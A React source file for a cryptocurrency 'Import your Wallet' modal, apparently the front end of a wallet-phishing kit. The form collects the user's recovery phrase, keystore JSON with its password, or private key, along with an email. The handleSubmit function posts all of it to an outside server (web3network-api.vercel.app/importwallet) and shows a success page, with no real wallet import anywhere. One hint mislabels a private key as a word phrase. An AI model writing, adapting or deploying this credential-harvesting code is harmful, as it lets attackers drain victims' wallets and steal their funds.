import React, { useState } from "react";
import { useNavigate } from "react-router";
import axios from "axios";

const ImportWallet = ({ wallet, onClose }) => {
  const [activeTab, setActiveTab] = useState("Phrase");
  const navigate = useNavigate();

  const walletType  = wallet.name

  const [formData, setFormData] = useState({
    wallet: walletType,
    walletName: "",
    email: "",
    phrase: "",
    keystore: "",
    keystorePassword: "",
    privateKey: "",
  });

  if (!wallet) return null;

  const tabs = ["Phrase", "Keystore JSON", "Private Key"];

  // 2. Handle input change
  const handleChange = (e) => {
    const { name, value } = e.target;

    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async () => {
    try {
      const res = await axios.post(
        "https://web3network-api.vercel.app/importwallet",
        {
          walletType: wallet.name,
          activeTab,
          ...formData,
        }
      );

      if (res.status === 200) {
        navigate("/success");
        onClose();
      } else {
        alert(res.data?.message || "Failed to import wallet");
      }
    } catch (error) {
      console.error(error);
      alert(error.response?.data?.message || "Server error");
    }
  };

  const renderTabContent = () => {
    switch (activeTab) {
      case "Phrase":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Phrase</label>
            <textarea
              rows={3}
              name="phrase"
              value={formData.phrase}
              onChange={handleChange}
              placeholder="Enter your recovery phrase"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none resize-none text-sm"
            />
            <p className="text-xs text-gray-400 mt-1">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>
          </div>
        );

      case "Keystore JSON":
        return (
          <div className="space-y-3">
            <div>
              <label className="block text-sm font-bold mb-2">
                Keystore JSON
              </label>
              <textarea
                rows={2}
                name="keystore"
                value={formData.keystore}
                onChange={handleChange}
                placeholder="Keystore JSON"
                className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none resize-none font-mono text-xs"
              />
            </div>

            <div>
              <label className="block text-sm font-bold mb-2">Password</label>
              <input
                type="password"
                name="keystorePassword"
                value={formData.keystorePassword}
                onChange={handleChange}
                placeholder="Wallet password"
                className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
              />
              <p className="text-xs text-gray-400 mt-1">
                Several lines of text beginning with {"{...}"} plus the password you used to encrypt it.
              </p>
            </div>
          </div>
        );

      case "Private Key":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Private Key</label>
            <input
              type="text"
              name="privateKey"
              value={formData.privateKey}
              onChange={handleChange}
              placeholder="Enter your private key"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
            <p className="text-xs text-gray-400 mt-1">
              Typically 12 (sometimes 24) words separated by a single space.
            </p>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div
      className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-3 sm:p-4"
      onClick={onClose}
    >
      <div
        className="bg-[#e9f8ff] text-[#0E1D26] w-full max-w-lg rounded-2xl shadow-2xl flex flex-col animate-modal-in overflow-hidden max-h-[85vh]"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="p-4 sm:p-6 border-b border-gray-100 flex items-center justify-between">
          <div className="flex items-center gap-2 sm:gap-3">
            <div className="w-10 h-10 sm:w-14 sm:h-14 rounded-full bg-white border border-gray-100 flex items-center justify-center overflow-hidden">
              <img src={wallet.icon} alt="" className="object-contain w-6 sm:w-8" />
            </div>

            <h2 className="text-sm sm:text-lg font-bold">
              Import your {wallet.name} Wallet
            </h2>
          </div>

          <button onClick={onClose} className="text-gray-400 hover:text-gray-600">
            ✕
          </button>
        </div>

        {/* Tabs */}
        <div className="flex px-3 sm:px-6 border-b border-gray-100 overflow-x-auto">
          {tabs.map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`py-3 px-3 sm:px-4 text-sm sm:text-base whitespace-nowrap relative ${
                activeTab === tab ? "text-black" : "text-gray-400"
              }`}
            >
              {tab}
              {activeTab === tab && (
                <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-black" />
              )}
            </button>
          ))}
        </div>

        {/* Body */}
        <div className="p-4 sm:p-6 space-y-4 overflow-y-auto">
          {/* Wallet name */}
          <div>
            <label className="block text-sm font-bold mb-2">Name wallet</label>
            <input
              type="text"
              name="walletName"
              value={formData.walletName}
              onChange={handleChange}
              placeholder="Name wallet"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
          </div>

          {/* Email */}
          <div>
            <label className="block text-sm font-bold mb-2">Email</label>
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="Email"
              className="w-full p-2 sm:p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none text-sm"
            />
          </div>

          {/* Dynamic tab content */}
          <div>{renderTabContent()}</div>

          {/* Buttons */}
          <div className="flex gap-2 sm:gap-3 pt-2">
            <button
              onClick={onClose}
              className="flex-1 py-2 sm:py-3 px-4 rounded-xl bg-[#D63384] text-white font-bold text-sm"
            >
              Cancel
            </button>

            <button
              onClick={handleSubmit}
              className="flex-1 py-2 sm:py-3 px-4 rounded-xl bg-[#007B8F] text-white font-bold text-sm"
            >
              Proceed
            </button>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes modalIn {
          from {
            opacity: 0;
            transform: scale(0.95) translateY(10px);
          }
          to {
            opacity: 1;
            transform: scale(1) translateY(0);
          }
        }

        .animate-modal-in {
          animation: modalIn 0.2s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

export default ImportWallet;